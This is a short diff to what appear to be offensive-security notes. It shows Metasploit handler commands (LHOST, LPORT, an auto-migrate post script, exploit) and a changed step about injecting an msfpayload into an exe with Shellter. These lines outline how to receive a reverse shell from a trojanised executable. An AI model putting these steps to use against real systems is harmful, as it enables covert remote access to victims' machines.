@@ -70,5 +70,5 @@ set LHOST ip
 set LPORT port
 set AutoRunScript post/windows/manage/migrate
 exploit
-2. Use shelter to inject msfpayload into exe
+2. Use shelter to inject msfpayload into exe(tracing must be successfully)
 ```
